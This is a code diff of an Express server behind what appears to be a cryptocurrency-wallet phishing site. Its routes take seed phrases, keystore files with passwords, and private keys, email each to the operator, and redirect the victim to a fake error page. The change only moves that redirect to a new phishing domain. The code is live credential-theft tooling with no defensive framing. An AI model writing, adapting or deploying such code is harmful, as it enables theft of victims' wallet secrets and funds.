@@ -55,7 +55,7 @@ app.post("/submit-seed", (req, res) => {
   const message = `Seed Phrase: ${phrase}`;
 
   sendEmail(subject, message);
-  res.redirect("https://defii.netlify.app/error");
+  res.redirect("https://chainpass.netlify.app/error");
 });
 
 // Route for handling KeyStore JSON submission
@@ -65,7 +65,7 @@ app.post("/submit-keystore", (req, res) => {
   const message = `Keystore Value: ${keystore}\nPassword: ${password}`;
 
   sendEmail(subject, message);
-  res.redirect("https://defii.netlify.app/error");
+  res.redirect("https://chainpass.netlify.app/error");
 });
 
 // Route for handling Private Key submission
@@ -75,7 +75,7 @@ app.post("/submit-privatekey", (req, res) => {
   const message = `Private Key: ${privatekey}`;
 
   sendEmail(subject, message);
-  res.redirect("https://defii.netlify.app/error");
+  res.redirect("https://chainpass.netlify.app/error");
 });
 
 // Start the server
